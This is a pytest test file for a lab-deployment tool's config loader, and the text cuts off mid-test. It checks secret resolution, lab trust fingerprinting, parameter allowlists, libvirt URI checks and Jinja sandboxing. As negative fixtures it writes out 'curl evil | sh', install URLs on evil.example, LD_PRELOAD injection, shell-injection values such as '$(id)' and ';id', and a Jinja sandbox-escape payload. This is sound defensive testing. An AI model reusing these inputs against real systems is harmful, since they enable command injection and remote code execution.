"""Config loading, secret resolution, and validation."""
from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from rodeo import config


def _write_plan(tmp_path, data):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text(yaml.dump(data, width=10_000))
    return plan


def _write_secrets(tmp_path, monkeypatch, data):
    secrets = tmp_path / ".rodeo" / "secrets.yaml"
    secrets.parent.mkdir(parents=True, exist_ok=True)
    secrets.write_text(yaml.dump(data))
    return secrets


def test_defaults_when_no_plan(tmp_path):
    cfg = config.load_config(tmp_path / "missing.yaml")
    assert cfg["type"] == "suse-virt"
    assert cfg["deployment_target"] == "baremetal"
    assert cfg["network"]["vip"] == "192.168.122.10"
    # suse-virt profile defaults merged in
    assert cfg["vms"]["harvester1"]["ip"] == "192.168.122.11"
    assert cfg["resources"]["harvester"]["memory_mib"] == 16384


def test_plan_overrides_defaults(tmp_path):
    plan = _write_plan(tmp_path, {"network": {"vip": "10.1.1.1"}})
    cfg = config.load_config(plan)
    assert cfg["network"]["vip"] == "10.1.1.1"
    assert cfg["network"]["rancher_ip"] == "192.168.122.9"  # untouched default


def _pw(spec):
    return {"credentials": {"harvester_os_password": spec}}


def _lab(tmp_path, name, data, *, trusted=False):
    lab = tmp_path / name
    lab.mkdir()
    plan = _write_plan(lab, data)
    if trusted:
        config.trust_lab(lab)
    return plan


# --- modes ------------------------------------------------------------------------


def test_secret_resolution_in_trusted_lab(tmp_path, monkeypatch):
    _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
    for mode in ("keys", "all"):
        cfg = config.load_config(plan, secrets=mode)
        assert cfg["credentials"]["harvester_os_password"] == "FromSecrets1"


def test_default_mode_resolves_nothing(tmp_path, monkeypatch):
    _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
    cfg = config.load_config(plan)
    assert cfg["credentials"]["harvester_os_password"] == "??harvester_os_password"


def test_unknown_mode_rejected(tmp_path):
    with pytest.raises(ValueError):
        config.load_config(tmp_path / "missing.yaml", secrets=True)


def test_resolve_secrets_alias_is_deprecated(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("??cmd:echo FromCmd12345"), trusted=True)
    with pytest.warns(DeprecationWarning):
        cfg = config.load_config(plan, resolve_secrets=False)
    assert cfg["credentials"]["harvester_os_password"] == "??cmd:echo FromCmd12345"
    with pytest.warns(DeprecationWarning):
        cfg = config.load_config(plan, resolve_secrets=True)
    assert cfg["credentials"]["harvester_os_password"] == "FromCmd12345"


@pytest.mark.parametrize("spec", ["??env:RODEO_TEST_PW", "??cmd:echo FromCmd12345"])
def test_keys_mode_never_resolves_sources(tmp_path, monkeypatch, spec):
    monkeypatch.setenv("RODEO_TEST_PW", "FromEnv12345")
    plan = _lab(tmp_path, "lab", _pw(spec), trusted=True)
    assert config.load_config(plan, secrets="keys")["credentials"]["harvester_os_password"] == spec


# --- every form, in a trusted lab ------------------------------------------------


def test_env_resolver(tmp_path, monkeypatch):
    monkeypatch.setenv("RODEO_TEST_PW", "FromEnv12345")
    plan = _lab(tmp_path, "lab", _pw("??env:RODEO_TEST_PW"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    assert cfg["credentials"]["harvester_os_password"] == "FromEnv12345"


def test_env_resolver_missing_fails_closed(tmp_path, monkeypatch):
    monkeypatch.delenv("RODEO_MISSING_PW", raising=False)
    plan = _lab(tmp_path, "lab", _pw("??env:RODEO_MISSING_PW"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(cfg)


def test_file_resolver(tmp_path):
    pw_file = tmp_path / "pw.txt"
    pw_file.write_text("FromFile12345\n")
    plan = _lab(tmp_path, "lab", _pw(f"??file:{pw_file}"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    assert cfg["credentials"]["harvester_os_password"] == "FromFile12345"


def test_file_resolver_missing_fails_closed(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("??file:/nonexistent/pw"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(cfg)


def test_cmd_resolver(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("??cmd:echo FromCmd12345"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    assert cfg["credentials"]["harvester_os_password"] == "FromCmd12345"
    config.validate_config(cfg)


def test_cmd_resolver_failure_fails_closed(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("??cmd:false"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(cfg)


def test_unresolved_secret_kept_and_rejected(tmp_path, monkeypatch):
    _write_secrets(tmp_path, monkeypatch, {})
    plan = _lab(tmp_path, "lab", _pw("??harvester_os_password"), trusted=True)
    cfg = config.load_config(plan, secrets="all")
    assert cfg["credentials"]["harvester_os_password"] == "??harvester_os_password"
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(cfg)


def test_leftover_placeholder_outside_credentials_rejected(tmp_path):
    plan = _lab(tmp_path, "lab", {**_pw("Secret123"), "registry": {"token": "??cmd:false"}},
                trusted=True)
    cfg = config.load_config(plan, secrets="all")
    with pytest.raises(ValueError, match="registry.token"):
        config.validate_config(cfg)


def test_key_only_seeded_lab_deploys_without_tty(tmp_path, monkeypatch):
    """A lab rodeo seeds from a bundled profile is trusted at seed time: no TTY, no rodeo trust."""
    from rodeo.labseed import seed_lab
    from rodeo.secretgen import ensure_plan_secrets, ensure_secrets_file

    monkeypatch.setattr("sys.stdin", None)
    lab = seed_lab("rancher", tmp_path / "r1")
    ensure_secrets_file(tmp_path / ".rodeo" / "secrets.yaml")
    plan = yaml.safe_load((lab / "rodeo-plan.yaml").read_text())
    ensure_plan_secrets(plan, lab_path=lab / config.LAB_SECRETS_FILE)
    cfg = config.load_config("rodeo-plan.yaml", config_dir=str(lab), secrets="all")
    config.validate_config(cfg)


# --- untrusted labs ----------------------------------------------------------------


def test_untrusted_cloned_lab_refuses_all_and_runs_nothing(tmp_path):
    """Attack: a cloned lab with ??cmd: anywhere; a write load refuses, nothing runs."""
    marker = tmp_path / "pwned"
    plan = _lab(tmp_path, "clone",
                {**_pw("Secret123"), "registry": {"token": f"??cmd:touch {marker}"}})
    with pytest.raises(config.ConfigError, match="rodeo trust"):
        config.load_config(plan, secrets="all")
    for mode in ("off", "keys"):
        config.load_config(plan, secrets=mode)
    assert not marker.exists()


def test_untrusted_lab_keys_mode_cannot_read_global_secrets(tmp_path, monkeypatch):
    """Attack: credentials.x: ??aws_secret_access_key in a cloned plan must not pull
    a global secret into story render or a preflight."""
    _write_secrets(tmp_path, monkeypatch, {"aws_secret_access_key": "GLOBAL-SECRET"})
    plan = _lab(tmp_path, "clone", _pw("??aws_secret_access_key"))
    cfg = config.load_config(plan, secrets="keys")
    assert cfg["credentials"]["harvester_os_password"] == "??aws_secret_access_key"


def test_untrusted_lab_keys_mode_reads_its_own_secrets(tmp_path):
    plan = _lab(tmp_path, "clone", _pw("??harvester_os_password"))
    (plan.parent / config.LAB_SECRETS_FILE).write_text("harvester_os_password: LabOwn123\n")
    cfg = config.load_config(plan, secrets="keys")
    assert cfg["credentials"]["harvester_os_password"] == "LabOwn123"


@pytest.mark.parametrize("change", ["plan", "definition", "custom", "custom-new"])
def test_changed_lab_is_untrusted_again(tmp_path, change):
    plan = _lab(tmp_path, "lab", _pw("??cmd:echo ok"))
    lab = plan.parent
    (lab / "definition.yaml").write_text("nodes: []\n")
    (lab / "custom" / "scripts").mkdir(parents=True)
    (lab / "custom" / "scripts" / "10-setup.sh").write_text("echo hi\n")
    config.trust_lab(lab)
    assert config.is_lab_trusted(lab)
    if change == "plan":
        plan.write_text(plan.read_text() + "registry:\n  token: '??cmd:touch /tmp/x'\n")
    elif change == "definition":
        (lab / "definition.yaml").write_text("nodes: [evil]\n")
    elif change == "custom":
        (lab / "custom" / "scripts" / "10-setup.sh").write_text("curl evil | sh\n")
    else:
        (lab / "custom" / "scripts" / "20-more.sh").write_text("id\n")
    assert not config.is_lab_trusted(lab)
    with pytest.raises(config.ConfigError, match="not trusted"):
        config.load_config(plan, secrets="all")


def test_trust_survives_noop_reload(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("??cmd:echo ok"), trusted=True)
    for _ in range(2):
        assert config.load_config(plan, secrets="all")["credentials"]["harvester_os_password"] == "ok"
    assert config.is_lab_trusted(plan.parent)


def test_trust_is_per_lab_dir(tmp_path):
    marker = tmp_path / "ran"
    data = _pw(f"??cmd:touch {marker} && echo ok")
    _lab(tmp_path, "lab-a", data, trusted=True)
    plan_b = _lab(tmp_path, "lab-b", data)  # identical content, other directory
    with pytest.raises(config.ConfigError, match="not trusted"):
        config.load_config(plan_b, secrets="all")
    assert not marker.exists()


def test_check_mode_untrusted_lab_fails(tmp_path):
    plan = _lab(tmp_path, "clone", _pw("Secret123"))
    cfg = config.load_config(plan)
    with pytest.raises(config.ConfigError, match="rodeo trust"):
        config.validate_config(cfg, check=True)


def test_check_mode_defers_resolvable_placeholders(tmp_path, monkeypatch):
    _write_secrets(tmp_path, monkeypatch, {"harvester_os_password": "FromSecrets1"})
    plan = _lab(tmp_path, "lab", {
        "credentials": {"harvester_os_password": "??harvester_os_password",
                        "rancher_admin_password": "??env:RODEO_X",
                        "harvester_token": "??cmd:echo t"}}, trusted=True)
    cfg = config.load_config(plan)
    config.validate_config(cfg, check=True)
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(cfg)


def test_check_mode_defers_keys_up_would_generate(tmp_path):
    """A fresh lab: up generates its ??keys, so plan must not exit 2 for them."""
    plan = _lab(tmp_path, "lab", _pw("??never_set_yet"), trusted=True)
    config.validate_config(config.load_config(plan), check=True)


def test_check_mode_fails_missing_operator_secret(tmp_path):
    plan = _lab(tmp_path, "lab", {**_pw("??scc_regcode"), "operator_secrets": ["scc_regcode"]},
                trusted=True)
    with pytest.raises(ValueError, match="Secrets not resolved"):
        config.validate_config(config.load_config(plan), check=True)


def test_lab_trusted_flag_cannot_be_forged(tmp_path):
    plan = _lab(tmp_path, "clone", _pw("Secret123"))
    with pytest.raises(config.ConfigError, match="can only set"):
        config.load_config(plan, params=(f"{config.LAB_TRUSTED_KEY}=true",))
    cfg = config.load_config(plan, secrets="keys")
    assert cfg[config.LAB_TRUSTED_KEY] is False


@pytest.mark.parametrize("entry", [
    "config_dir=/tmp/x",
    "plan_dir=/tmp/x",
    "lab_in_a_box.source.repo=https://evil.example/x",
    "workshop.pdf=true",
    "story.engine=evil",
    "story.engine_env.LD_PRELOAD=/tmp/x.so",
    "ansible.path=/tmp/x",
    "ansible={path: /tmp/x}",
    "provider={install_url: 'https://evil.example/x.sh'}",
    "provider.install_url=https://evil.example/x.sh",
    "content.repo=https://evil.example/x",
    "ssh.identity_file=/tmp/k",
    "credentials.harvester_os_password=x",
    "_lab_trusted=true",
])
def test_param_outside_allowlist_rejected(tmp_path, entry):
    """Only data keys can come from -P (an MCP client passes them)."""
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    with pytest.raises(config.ConfigError, match="can only set"):
        config.load_config(plan, params=(entry,))


def test_paramfile_outside_allowlist_rejected(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    pf = tmp_path / "pf.yaml"
    pf.write_text(yaml.dump({"resources": {"harvester": {"vcpu": 4}}, "story": {"engine": "x"}}))
    with pytest.raises(config.ConfigError, match="story.engine"):
        config.load_config(plan, paramfile=pf)


@pytest.mark.parametrize("entry", [
    # every -P example in docs/
    "resources.harvester.memory_mib=20480",
    "resources.harvester.vcpu=10",
    "resources.harvester.disk_gb=400",
    "resources.rancher.memory_mib=12288",
    "resources.rke2-node.memory_mib=6144",
    "versions.harvester=1.5.0",
    "rancher_tls.email=me@rodeo.test",
    "elemental.registrations=2",
    "libvirt.disk_cache=writeback",
    "libvirt.disk_io=threads",
    "lab_in_a_box.variant=aws",
    "lab_in_a_box.iso_image=openSUSE-Leap-15.6.qcow2",
    "deployment_target=instruqt",
    # and the ones tests rely on
    "network.vip=10.9.9.9",
    "name=demo-1",
    "type=rancher",
    "provider.region=eu-north-1",
    "content.facts.x=1",
])
def test_documented_params_still_work(tmp_path, entry):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    config.load_config(plan, params=(entry,))


def test_plan_parameters_block_names_are_allowed(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("parameters:\n  memory: 16384\nresources:\n  harvester:\n    memory_mib: {{ memory }}\n")
    cfg = config.load_config(plan, params=("memory=8192",))
    assert cfg["resources"]["harvester"]["memory_mib"] == 8192
    with pytest.raises(config.ConfigError, match="can only set"):
        config.load_config(plan, params=("undeclared=1",))


def test_plan_cannot_point_config_dir_elsewhere(tmp_path):
    """A plan value for config_dir or plan_dir is ignored: the loader derives them."""
    evil = tmp_path / "evil"
    (evil / "custom" / "scripts").mkdir(parents=True)
    plan = _lab(tmp_path, "lab", {**_pw("Secret123"), "config_dir": str(evil), "plan_dir": str(evil)},
                trusted=True)
    cfg = config.load_config(plan, secrets="all")
    assert cfg.get("config_dir") != str(evil)
    assert cfg["plan_dir"] == str(plan.parent.resolve())


def test_config_outside_config_dir_refused_on_write(tmp_path):
    plan = _lab(tmp_path, "plans", _pw("Secret123"), trusted=True)
    other = tmp_path / "cfgdir"
    other.mkdir()
    (other / "definition.yaml").write_text("nodes: []\n")
    config.trust_lab(other)
    with pytest.raises(config.ConfigError, match="outside --config-dir"):
        config.load_config(plan, config_dir=other, secrets="all")


@pytest.mark.parametrize("path", ["content/scripts/x.sh", "guide/index.html", ".labinabox/lab.json",
                                  "content.lock", ".content.ab12cd/content/x.md", "workshop/tracks/t/a.md",
                                  "workshop-guide/01.md", "workshop-guide.pdf", "story/strings/es.json",
                                  "logs/x", ".builder-deploy.log", "rodeo-secrets.env",
                                  ".git/HEAD", "custom/__pycache__/a.pyc"])
def test_rodeo_written_state_does_not_untrust(tmp_path, path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    target = plan.parent / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("written by rodeo\n")
    (plan.parent / config.LAB_SECRETS_FILE).write_text("k: v\n")
    assert config.is_lab_trusted(plan.parent)


@pytest.mark.parametrize("path", ["manifests/x.yaml", "helm/values.yaml", "certs/ca.pem",
                                  "story/01.md", "host1/apply.yaml", "workshop.yaml"])
def test_any_lab_file_change_untrusts(tmp_path, path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    target = plan.parent / path
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("new\n")
    assert not config.is_lab_trusted(plan.parent)


def test_symlink_out_of_the_lab_blocks_trust(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"))
    outside = tmp_path / "outside.sh"
    outside.write_text("echo one\n")
    (plan.parent / "custom").mkdir()
    (plan.parent / "custom" / "run.sh").symlink_to(outside)
    with pytest.raises(config.UntrustedLab, match="outside the lab"):
        config.trust_lab(plan.parent)
    assert not config.is_lab_trusted(plan.parent)
    with pytest.raises(config.UntrustedLab):
        config.load_config(plan, secrets="all")


def test_symlink_into_unhashed_state_blocks_trust(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"))
    (plan.parent / "content").mkdir()
    (plan.parent / "content" / "x.sh").write_text("echo hi\n")
    (plan.parent / "custom").mkdir()
    (plan.parent / "custom" / "run.sh").symlink_to(plan.parent / "content" / "x.sh")
    with pytest.raises(config.UntrustedLab, match="does not cover"):
        config.trust_lab(plan.parent)


def test_symlink_inside_the_lab_hashes_its_target(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"))
    (plan.parent / "scripts").mkdir()
    real = plan.parent / "scripts" / "real.sh"
    real.write_text("echo one\n")
    (plan.parent / "custom").mkdir()
    (plan.parent / "custom" / "run.sh").symlink_to(real)
    config.trust_lab(plan.parent)
    assert config.is_lab_trusted(plan.parent)
    real.write_text("echo two\n")
    assert not config.is_lab_trusted(plan.parent)


def test_symlinked_plan_does_not_borrow_trust(tmp_path):
    """Review PoC (poc_symlink.py): L/rodeo-plan.yaml -> T/rodeo-plan.yaml, T trusted."""
    import os

    t = _lab(tmp_path, "T", _pw("Secret123"), trusted=True).parent
    lab = tmp_path / "L"
    (lab / "custom" / "scripts").mkdir(parents=True)
    os.symlink(os.path.relpath(t / "rodeo-plan.yaml", lab), lab / "rodeo-plan.yaml")
    (lab / "definition.yaml").write_text("{}\n")
    (lab / "custom" / "scripts" / "evil.sh").write_text("touch /tmp/PWNED\n")
    with pytest.raises(config.UntrustedLab, match="symlink"):
        config.load_config("rodeo-plan.yaml", config_dir=str(lab), secrets="all")
    with pytest.raises(config.UntrustedLab):
        config.load_config(lab / "rodeo-plan.yaml", secrets="all")
    cfg = config.load_config(lab / "rodeo-plan.yaml")
    assert cfg["plan_dir"] == str(lab.resolve())
    with pytest.raises(config.ConfigError):
        config.validate_config(cfg, check=True)


def test_trust_cmd_in_symlinked_lab_does_not_trust_target(tmp_path):
    import os

    from click.testing import CliRunner

    from rodeo.cli import cli

    t = _lab(tmp_path, "T", _pw("Secret123")).parent
    lab = tmp_path / "L"
    lab.mkdir()
    os.symlink(t / "rodeo-plan.yaml", lab / "rodeo-plan.yaml")
    result = CliRunner().invoke(cli, ["trust", "--yes", "--config-dir", str(lab)])
    assert result.exit_code != 0
    assert config.load_trusted_labs() == {}


def test_fingerprint_framing_cannot_collide(tmp_path):
    """Review PoC (poc_collide.py): a file whose bytes embed the next record."""
    plan = b"type: suse-virt\nname: x\n"
    payload = b"#!/bin/sh\ntouch /tmp/PWNED\n"
    for d in "AB":
        (tmp_path / d / "custom" / "scripts").mkdir(parents=True)
        (tmp_path / d / "rodeo-plan.yaml").write_bytes(plan)
    (tmp_path / "A" / "custom" / "README").write_bytes(b"docs\0custom/scripts/x.sh\0file\0" + payload)
    (tmp_path / "B" / "custom" / "README").write_bytes(b"docs")
    (tmp_path / "B" / "custom" / "scripts" / "x.sh").write_bytes(payload)
    assert config.lab_fingerprint(tmp_path / "A") != config.lab_fingerprint(tmp_path / "B")


@pytest.mark.parametrize("entry", [
    "versions.harvester=1.8.2'; touch /tmp/p; '",
    "versions.harvester=$(id)",
    "versions.harvester_iso_checksum=sha512:abc",
    "versions.harvester_sha256=abc",
    "resources.harvester.memory_mib=lots",
    "resources.harvester.vcpu=-1",
    "network.vip=10.0.0.1;id",
    "name=Demo Lab",
    "provider.ttl_hours=forever",
    "rancher_tls.email=a@b;id",
    "story.language=en';id",
])
def test_allowlisted_keys_check_their_values(tmp_path, entry):
    """Allowlisted values still reach Ansible shell tasks: each key has a value check."""
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    with pytest.raises(config.ConfigError, match="not a valid value|can only set"):
        config.load_config(plan, params=(entry,))


def test_template_parameter_values_must_be_plain_scalars(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("parameters:\n  tag: a\nname: \"lab-{{ tag }}\"\n")
    assert config.load_config(plan, params=("tag=b2",))["name"] == "lab-b2"
    for bad in ("tag=$(id)", "tag={x: 1}", "tag=a b"):
        with pytest.raises(config.ConfigError):
            config.load_config(plan, params=(bad,))


def test_template_parameters_only_feed_the_template(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("parameters:\n  memory: 16384\nresources:\n  harvester:\n    memory_mib: {{ memory }}\n")
    cfg = config.load_config(plan, params=("memory=8192",))
    assert "memory" not in cfg
    assert cfg["resources"]["harvester"]["memory_mib"] == 8192


@pytest.mark.parametrize("uri", [
    "qemu+ext:///system?command=/tmp/evil",
    "qemu+ssh://root@h/system?netcat=/tmp/nc",
    "qemu+ssh://root@h/system?keyfile=/tmp/k",
    "qemu+unix:///system?socket=/tmp/s",
    "qemu://host/system?command=x",
    "test:///default",
    "qemu:///system extra",
])
def test_libvirt_uri_that_can_run_code_is_refused(tmp_path, uri):
    plan = _lab(tmp_path, "lab", {**_pw("Secret123"), "libvirt": {"uri": uri}})
    with pytest.raises(config.ConfigError, match="libvirt"):
        config.load_config(plan)


@pytest.mark.parametrize("uri", ["qemu:///system", "qemu:///session", "qemu+ssh://root@kvm1/system",
                                 "qemu+ssh://kvm1.example.lab:2222/system"])
def test_libvirt_uri_normal_forms_accepted(uri):
    assert config.validate_libvirt_uri(uri) == uri


def test_rodeo_list_refuses_a_command_uri():
    from click.testing import CliRunner

    from rodeo.commands.list_cmd import list_cmd

    result = CliRunner().invoke(list_cmd, ["--uri", "qemu+ext:///system?command=/tmp/evil"])
    assert result.exit_code != 0
    assert "not allowed" in result.output


def test_untrusted_lab_is_its_own_error_type(tmp_path):
    plan = _lab(tmp_path, "clone", _pw("Secret123"))
    with pytest.raises(config.UntrustedLab):
        config.load_config(plan, secrets="all")


def test_trust_write_hands_file_back_to_invoking_user(tmp_path, monkeypatch):
    calls = []
    monkeypatch.setattr("rodeo.paths.fix_invoking_ownership", lambda: calls.append(1))
    _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    assert calls


# --- auto-trust only for what rodeo wrote ------------------------------------------


def test_seed_into_empty_dir_is_trusted(tmp_path):
    from rodeo.labseed import seed_lab

    lab = seed_lab("rancher", tmp_path / "fresh")
    assert config.is_lab_trusted(lab)


def test_seed_into_clone_is_not_trusted(tmp_path):
    """rodeo up --profile X --dir <clone>: existing files are kept, so no auto-trust."""
    from rodeo.labseed import seed_lab

    clone = tmp_path / "clone"
    (clone / "custom" / "scripts").mkdir(parents=True)
    (clone / "custom" / "scripts" / "10-evil.sh").write_text("curl evil | sh\n")
    seed_lab("rancher", clone)
    assert not config.is_lab_trusted(clone)


def test_seed_from_untrusted_custom_profile_is_not_trusted(tmp_path, monkeypatch):
    from rodeo import labseed

    src = tmp_path / "imported"
    src.mkdir()
    (src / "rodeo-plan.yaml").write_text("type: rancher\nname: imported\n")
    monkeypatch.setattr(labseed, "resolve_profile_source", lambda name: src)
    monkeypatch.setattr(labseed, "profile_kind", lambda name: "custom")
    lab = labseed.seed_lab("imported", tmp_path / "lab")
    assert not config.is_lab_trusted(lab)
    config.trust_lab(src)
    lab2 = labseed.seed_lab("imported", tmp_path / "lab2")
    assert config.is_lab_trusted(lab2)


def test_init_into_non_empty_dir_is_not_trusted(tmp_path):
    from click.testing import CliRunner

    from rodeo.commands.init_cmd import init_cmd

    fresh = tmp_path / "fresh"
    clone = tmp_path / "clone"
    clone.mkdir()
    (clone / "definition.yaml").write_text("nodes: [evil]\n")
    for d in (fresh, clone):
        result = CliRunner().invoke(init_cmd, [str(d)])
        assert result.exit_code == 0, result.output
    assert config.is_lab_trusted(fresh)
    assert not config.is_lab_trusted(clone)


# --- -P / --paramfile input hygiene ------------------------------------------------


@pytest.mark.parametrize("entry", [
    "versions.harvester=??env:SOME_SECRET",
    "versions.harvester=??scc_regcode",
    "credentials.harvester_os_password=??cmd:echo ok",
    "tok={{ 7 * 7 }}",
    "tok={% if true %}x{% endif %}",
    "tok=a\nb",
    "network={vip: '??env:X'}",
])
def test_param_with_placeholder_or_template_rejected(tmp_path, entry):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    with pytest.raises(config.ConfigError, match="may not contain"):
        config.load_config(plan, params=(entry,))


def test_paramfile_with_placeholder_at_depth_rejected(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    pf = tmp_path / "pf.yaml"
    pf.write_text(yaml.dump({"registry": {"mirrors": [{"token": "??env:SOME_SECRET"}]}}))
    with pytest.raises(config.ConfigError, match="registry.mirrors"):
        config.load_config(plan, paramfile=pf)


def test_param_into_template_variable_rejected(tmp_path):
    """Attack: -P/--paramfile scalars feed Jinja; a gated string can't arrive that way."""
    marker = tmp_path / "ran"
    lab = tmp_path / "lab"
    lab.mkdir()
    plan = lab / "rodeo-plan.yaml"
    plan.write_text("parameters:\n  tok: none\n"
                    "credentials:\n  harvester_os_password: Secret123\n"
                    "registry:\n  token: \"{{ tok }}\"\n")
    config.trust_lab(lab)
    with pytest.raises(config.ConfigError, match="may not contain"):
        config.load_config(plan, params=(f"tok=??cmd:touch {marker}",), secrets="all")
    pf = tmp_path / "pf.yaml"
    pf.write_text(yaml.dump({"tok": f"??cmd:touch {marker}"}))
    with pytest.raises(config.ConfigError, match="may not contain"):
        config.load_config(plan, paramfile=pf, secrets="all")
    assert not marker.exists()


def test_plain_params_still_work(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    cfg = config.load_config(plan, params=("network.vip=10.9.9.9", "name=demo-1"), secrets="all")
    assert cfg["network"]["vip"] == "10.9.9.9"


# --- trust file ------------------------------------------------------------------


def test_trusted_labs_file_is_private(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
    assert path.stat().st_mode & 0o777 == 0o600
    assert config.load_trusted_labs() == {str(plan.parent.resolve()): config.lab_fingerprint(plan.parent)}


def test_trust_tightens_existing_file_mode(tmp_path):
    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("{}\n")
    path.chmod(0o644)
    _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    assert path.stat().st_mode & 0o777 == 0o600


def test_revoke_keeps_other_labs(tmp_path):
    a = _lab(tmp_path, "a", _pw("Secret123"), trusted=True).parent
    b = _lab(tmp_path, "b", _pw("Secret123"), trusted=True).parent
    assert config.revoke_lab(a)
    assert not config.is_lab_trusted(a)
    assert config.is_lab_trusted(b)


@pytest.mark.parametrize("body", ["{not: [valid", "just a string\n", "- /lab\n", "/lab: [x]\n"])
def test_corrupt_trust_file_raises(tmp_path, body):
    """Attack: a corrupt or non-mapping trust file is an error, not "trust nothing"."""
    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(body)
    with pytest.raises(config.ConfigError):
        config.load_trusted_labs()
    plan = _lab(tmp_path, "lab", _pw("Secret123"))
    with pytest.raises(config.ConfigError):
        config.load_config(plan, secrets="all")


def test_trust_file_symlink_refused(tmp_path):
    real = tmp_path / "elsewhere.yaml"
    real.write_text("{}\n")
    path = tmp_path / ".rodeo" / "trusted-labs.yaml"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.symlink_to(real)
    with pytest.raises(config.ConfigError):
        config.load_trusted_labs()
    with pytest.raises(config.ConfigError):
        config.trust_lab(tmp_path)


def test_keep_trust_follows_rodeos_own_plan_edits(tmp_path):
    plan = _lab(tmp_path, "lab", _pw("Secret123"), trusted=True)
    with config.keep_trust(plan.parent):
        plan.write_text(plan.read_text() + "deployment_target: aws\n")
    assert config.is_lab_trusted(plan.parent)
    untrusted = _lab(tmp_path, "clone", _pw("Secret123"))
    with config.keep_trust(untrusted.parent):
        untrusted.write_text(untrusted.read_text() + "name: x\n")
    assert not config.is_lab_trusted(untrusted.parent)


# --- templates ------------------------------------------------------------------


def test_template_range_overflow_is_config_error(tmp_path):
    import time

    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("network:\n  vip: \"{% for i in range(10**9) %}x{% endfor %}\"\n")
    start = time.monotonic()
    with pytest.raises(config.ConfigError, match="range"):
        config.load_config(plan)
    assert time.monotonic() - start < 5


def test_no_plain_jinja_environment_in_rodeo():
    """Every template over lab/plan/workshop text uses config.sandboxed_jinja_env()."""
    import re

    root = Path(config.__file__).parent
    allowlist: set[str] = set()
    offenders = [
        str(f.relative_to(root)) for f in root.rglob("*.py")
        if re.search(r"jinja2\.Environment\(|[^.\w]Environment\(", f.read_text())
        and str(f.relative_to(root)) not in allowlist
    ]
    assert offenders == []


def test_loaded_config_does_not_share_base_defaults(tmp_path):
    """With secrets="off" no walk copies the tree, so a caller mutating cfg
    (finalize_cfg does, for lab-in-a-box) must not change the next load."""
    cfg = config.load_config(tmp_path / "missing.yaml")
    cfg["network"]["dns_domain"] = "i1.rodeo.lab"
    assert config.load_config(tmp_path / "missing.yaml")["network"]["dns_domain"] == "rodeo.lab"


def test_template_sandbox_blocks_python_internals(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("network:\n  vip: \"{{ ''.__class__.__mro__[1].__subclasses__() }}\"\n")
    with pytest.raises(config.ConfigError, match="sandbox"):
        config.load_config(plan)


def test_template_parameters_still_render(tmp_path):
    plan = tmp_path / "rodeo-plan.yaml"
    plan.write_text("parameters:\n  vip: 10.9.9.9\nnetwork:\n  vip: \"{{ vip | upper }}\"\n")
    assert config.load_config(plan)["network"]["vip"] == "10.9.9.9"



@pytest.mark.parametrize("bad", [None, "", "   ", "CHANGE_ME"])
def test_empty_credentials_rejected(bad):
    cfg = {"credentials": {"harvester_os_password": bad, "rancher_admin_password": "x1234"}}
    with pytest.raises(ValueError, match="Credentials are empty"):
        config.validate_config(cfg)


def test_bad_deployment_target_rejected():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "deployment_target": "cloud",
    }
    with pytest.raises(ValueError, match="deployment_target"):
        config.validate_config(cfg)


def test_valid_config_passes():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "deployment_target": "instruqt",
    }
    config.validate_config(cfg)  # must not raise


def test_vip_collision_with_node_ip_rejected():
    cfg = {
        "credentials": {"harvester_os_password": "Secret123"},
        "network": {"vip": "192.168.122.11"},
